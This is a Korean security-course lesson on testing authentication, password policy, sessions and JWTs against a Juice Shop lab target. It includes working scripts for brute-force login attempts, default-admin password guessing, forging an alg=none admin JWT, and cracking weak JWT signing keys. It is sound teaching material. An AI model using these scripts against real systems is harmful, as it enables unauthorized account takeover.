# Week 04: 인증/세션 관리 점검

## 학습 목표
- 웹 애플리케이션의 인증 메커니즘을 이해하고 점검할 수 있다
- 비밀번호 정책의 적절성을 평가한다
- 세션 관리(생성, 유지, 만료)의 보안성을 점검한다
- JWT(JSON Web Token)의 구조를 이해하고 취약점을 검증한다

## 전제 조건
- HTTP 요청/응답, 쿠키 개념 이해
- curl 기본 사용법 (Week 02)

---

## 1. 인증(Authentication) 개요 (15분)

### 1.1 인증 vs 인가

| 개념 | 질문 | 예시 |
|------|------|------|
| **인증 (Authentication)** | "너 누구야?" | 로그인 (ID/PW) |
| **인가 (Authorization)** | "너 이거 할 수 있어?" | 관리자만 접근 가능 |

### 1.2 일반적인 인증 흐름

```
1. 사용자 → 로그인 폼에 ID/PW 입력
2. 서버 → DB에서 ID/PW 확인
3. 서버 → 세션ID 또는 JWT 토큰 발급
4. 사용자 → 이후 요청에 세션ID/토큰 포함
5. 서버 → 세션ID/토큰으로 사용자 식별
```

### 1.3 OWASP 인증 관련 취약점

| 취약점 | 설명 |
|--------|------|
| A07:2021 Identification & Authentication Failures | 인증 실패 |
| 약한 비밀번호 정책 | 짧은/단순한 비밀번호 허용 |
| 무차별 대입 공격 (Brute Force) | 비밀번호 반복 시도 |
| 세션 고정 공격 (Session Fixation) | 세션 ID 강제 |
| 세션 하이재킹 (Session Hijacking) | 세션 ID 탈취 |

---

## 2. JuiceShop 계정 생성 및 로그인 (15분)

### 2.1 회원가입

```bash
# JuiceShop 회원가입 API
curl -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{
    "email": "student@test.com",
    "password": "Test1234!",
    "passwordRepeat": "Test1234!",
    "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},
    "securityAnswer": "test"
  }'

# 응답에서 user 정보 확인
```

### 2.2 로그인

```bash
# 로그인 요청
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -m json.tool

# 응답에서 토큰 추출
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

echo "토큰: $TOKEN"
```

### 2.3 인증된 요청

```bash
# 토큰을 이용한 인증된 API 호출
curl -s http://10.20.30.80:3000/rest/user/whoami \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# 장바구니 조회
curl -s http://10.20.30.80:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

---

## 3. 비밀번호 정책 점검 (30분)

### 3.1 점검 항목

| 항목 | 권장 기준 | 점검 방법 |
|------|----------|----------|
| 최소 길이 | 8자 이상 | 짧은 PW로 가입 시도 |
| 복잡성 | 대/소/숫자/특수 | 단순 PW로 가입 시도 |
| 일반 PW 차단 | password, 123456 등 | 흔한 PW로 가입 시도 |
| 계정 잠금 | 5회 실패 후 잠금 | 반복 로그인 실패 |

### 3.2 약한 비밀번호 테스트

```bash
# 테스트 1: 매우 짧은 비밀번호
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"weak1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}'
echo ""

# 테스트 2: 숫자만으로 구성
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"weak2@test.com","password":"12345","passwordRepeat":"12345","securityQuestion":{"id":1},"securityAnswer":"a"}'
echo ""

# 테스트 3: 흔한 비밀번호
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"weak3@test.com","password":"password","passwordRepeat":"password","securityQuestion":{"id":1},"securityAnswer":"a"}'
echo ""

# 결과 분석: 가입이 성공하면 비밀번호 정책이 약한 것
```

### 3.3 무차별 대입 공격 (Brute Force) 테스트

```bash
# 로그인 실패 반복 시 잠금 여부 확인
for i in $(seq 1 10); do
  result=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')
  echo "시도 $i: HTTP $result"
done

# 모든 시도가 401이면 계정 잠금 정책이 없다는 의미
# 429 (Too Many Requests)가 나오면 Rate Limiting 존재
```

### 3.4 기본 계정 점검

```bash
# JuiceShop 기본 관리자 계정으로 로그인 시도
# admin@juice-sh.op + 흔한 비밀번호
for pw in "admin" "admin123" "password" "admin1234" "juice" "12345678"; do
  result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}")
  if echo "$result" | grep -q "token"; then
    echo "[성공!] admin@juice-sh.op / $pw"
    break
  else
    echo "[실패] $pw"
  fi
done
```

---

## 4. 세션 관리 점검 (30분)

### 4.1 세션 관리 점검 항목

| 항목 | 위험 | 점검 방법 |
|------|------|----------|
| 세션 ID 길이/랜덤성 | 예측 가능한 세션 | 여러 세션 비교 |
| 세션 타임아웃 | 무한 세션 유지 | 시간 후 재접근 |
| 로그아웃 처리 | 서버에서 세션 무효화 안함 | 로그아웃 후 토큰 재사용 |
| 다중 로그인 | 세션 제한 없음 | 동시 로그인 시도 |
| HTTPS Only 쿠키 | 평문 전송 위험 | Set-Cookie 헤더 확인 |

### 4.2 세션 ID 랜덤성 확인

```bash
# JuiceShop는 JWT 사용 → 여러 번 로그인하여 토큰 비교
for i in 1 2 3; do
  token=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
  echo "토큰 $i: ${token:0:50}..."
done

# 매번 다른 토큰이 발급되어야 정상
```

### 4.3 로그아웃 후 토큰 유효성 점검

```bash
# 1. 로그인하여 토큰 획득
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 2. 로그인 상태 확인
echo "=== 로그아웃 전 ==="
curl -s http://10.20.30.80:3000/rest/user/whoami \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null

# 3. 로그아웃 (JuiceShop는 클라이언트 측 로그아웃)
# JWT 기반이므로 서버 측 세션 무효화가 있는지 확인

# 4. 이전 토큰으로 다시 접근 시도
echo ""
echo "=== 로그아웃 후 동일 토큰으로 접근 ==="
curl -s http://10.20.30.80:3000/rest/user/whoami \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null

# 여전히 접근되면 → 서버 측 토큰 무효화 미흡 (취약)
```

### 4.4 다중 로그인 점검

```bash
# 동일 계정으로 두 개의 세션 생성
TOKEN1=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

TOKEN2=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 두 토큰 모두 유효한지 확인
echo "토큰1 유효:"
curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN1" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null

echo "토큰2 유효:"
curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN2" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null

# 둘 다 유효하면 → 다중 로그인 미제어 (점검 결과로 기록)
```

---

## 5. JWT 분석 및 점검 (30분)

### 5.1 JWT 구조

JWT는 세 부분으로 구성된다:

```
HEADER.PAYLOAD.SIGNATURE

Header:  {"alg":"HS256","typ":"JWT"}  → Base64 인코딩
Payload: {"email":"admin","role":"admin","iat":1234567890}  → Base64 인코딩
Signature: HMACSHA256(header + "." + payload, secret)
```

### 5.2 JWT 디코딩

```bash
# 로그인하여 JWT 획득
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# JWT의 각 부분 디코딩 (Base64)
echo "=== Header ==="
echo "$TOKEN" | cut -d'.' -f1 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip(); s+='='*(4-len(s)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))"

echo ""
echo "=== Payload ==="
echo "$TOKEN" | cut -d'.' -f2 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip(); s+='='*(4-len(s)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))"
```

### 5.3 JWT 취약점 점검

**취약점 1: alg=none 공격**

```bash
# alg을 none으로 변경한 JWT 생성
python3 << 'PYEOF'
import base64, json

# Header: alg=none
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()

# Payload: admin 권한으로 변조
payload = base64.urlsafe_b64encode(json.dumps({
    "status":"success",
    "data":{"email":"admin@juice-sh.op","role":"admin"},
    "iat":1700000000
}).encode()).rstrip(b'=').decode()

fake_token = f"{header}.{payload}."
print(f"조작된 토큰: {fake_token[:60]}...")

# 이 토큰으로 접근 시도
import subprocess
result = subprocess.run(
    ["curl", "-s", "http://10.20.30.80:3000/rest/user/whoami",
     "-H", f"Authorization: Bearer {fake_token}"],
    capture_output=True, text=True
)
print(f"응답: {result.stdout[:200]}")
PYEOF
```

**취약점 2: 약한 서명 키**

```bash
# JWT 서명 키가 약한지 확인 (흔한 키로 시도)
# 실무에서는 jwt-cracker 같은 도구를 사용
python3 << 'PYEOF'
import hmac, hashlib, base64, json

# JuiceShop에서 획득한 토큰의 header.payload 부분
import subprocess
r = subprocess.run(
    ["curl", "-s", "-X", "POST", "http://10.20.30.80:3000/rest/user/login",
     "-H", "Content-Type: application/json",
     "-d", '{"email":"student@test.com","password":"Test1234!"}'],
    capture_output=True, text=True
)
try:
    token = json.loads(r.stdout)['authentication']['token']
    parts = token.split('.')
    data = f"{parts[0]}.{parts[1]}"
    sig = parts[2]

    # 흔한 시크릿 키로 서명 검증 시도
    common_secrets = ["secret", "jwt_secret", "password", "key", "123456",
                      "your-256-bit-secret", "change-me"]
    for secret in common_secrets:
        computed = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), data.encode(), hashlib.sha256).digest()
        ).rstrip(b'=').decode()
        if computed == sig:
            print(f"[취약!] JWT 서명 키 발견: '{secret}'")
            break
    else:
        print("흔한 키로는 서명 키를 찾지 못함 (양호)")
except Exception as e:
    print(f"테스트 실패: {e}")
PYEOF
```

### 5.4 JWT 만료 시간 확인

```bash
# JWT payload의 exp (만료시간) 확인
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

echo "$TOKEN" | cut -d'.' -f2 | python3 -c "
import sys, base64, json
from datetime import datetime
s = sys.stdin.read().strip()
s += '=' * (4 - len(s) % 4)
payload = json.loads(base64.urlsafe_b64decode(s))
if 'exp' in payload:
    exp = datetime.fromtimestamp(payload['exp'])
    iat = datetime.fromtimestamp(payload.get('iat', 0))
    print(f'발급 시각: {iat}')
    print(f'만료 시각: {exp}')
    print(f'유효 기간: {exp - iat}')
else:
    print('만료 시간(exp) 없음 → 무한 유효 토큰 (취약)')
print(f'전체 payload: {json.dumps(payload, indent=2)}')
"
```

---

## 6. 실습 과제

### 과제 1: 비밀번호 정책 점검 보고서
1. 다양한 약한 비밀번호(1자, 숫자만, 흔한 단어 등)로 가입을 시도하라
2. 어떤 비밀번호가 허용/거부되는지 표로 정리하라
3. JuiceShop의 비밀번호 정책을 평가하고 개선 권고를 작성하라

### 과제 2: 세션 관리 점검
1. JWT 토큰의 유효 기간을 확인하라
2. 로그아웃 후 토큰이 여전히 유효한지 테스트하라
3. 다중 로그인이 가능한지 확인하라
4. 점검 결과를 보고서 형식으로 정리하라

### 과제 3: JWT 보안 분석
1. JWT를 디코딩하여 포함된 정보를 모두 나열하라
2. 민감 정보가 JWT에 포함되어 있는지 확인하라
3. alg=none 공격이 통하는지 테스트하라

---

## 7. 요약

| 점검 항목 | 확인 사항 | 도구/명령 |
|----------|----------|----------|
| 비밀번호 정책 | 길이, 복잡성, 사전단어 | curl + 가입 API |
| 무차별 대입 | 계정 잠금, Rate Limiting | curl 반복 호출 |
| 세션 만료 | 타임아웃 설정 | JWT exp 필드 |
| 로그아웃 | 서버 측 무효화 | 토큰 재사용 테스트 |
| JWT 보안 | alg, 서명 키 강도 | Python 디코딩 |

**다음 주 예고**: Week 05 - 입력값 검증 (1): SQL Injection. Blind SQLi, Time-based, UNION 기법을 학습한다.
